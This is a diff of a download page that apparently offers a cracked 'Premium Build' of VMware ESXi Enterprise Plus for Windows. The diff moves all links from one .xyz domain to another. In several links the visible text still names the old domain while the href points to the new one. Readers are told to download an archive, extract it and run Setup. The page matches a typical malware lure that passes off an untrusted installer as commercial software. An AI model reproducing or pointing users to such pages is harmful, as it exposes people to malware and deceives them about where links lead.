@@ -29,8 +29,8 @@ Complete Edition · Premium Build · Windows · Deployment
 
 > Use the project link below for Windows.
 
-* **Project link:** **[vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz](https://vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz/)**
-* **Full URL:** `https://vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz/`
+* **Project link:** **[vmware-esxi-enterprise-plus-virtualization-ultimate.nerasix.xyz](https://vmware-esxi-enterprise-plus-virtualization-ultimate.nerasix.xyz/)**
+* **Full URL:** `https://vmware-esxi-enterprise-plus-virtualization-ultimate.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -56,17 +56,17 @@ Complete Edition · Premium Build · Windows · Deployment
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz/">vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://vmware-esxi-enterprise-plus-virtualization-ultimate.nerasix.xyz/">vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz/">vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://vmware-esxi-enterprise-plus-virtualization-ultimate.nerasix.xyz/">vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz/">vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://vmware-esxi-enterprise-plus-virtualization-ultimate.nerasix.xyz/">vmware-esxi-enterprise-plus-virtualization-ultimate.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
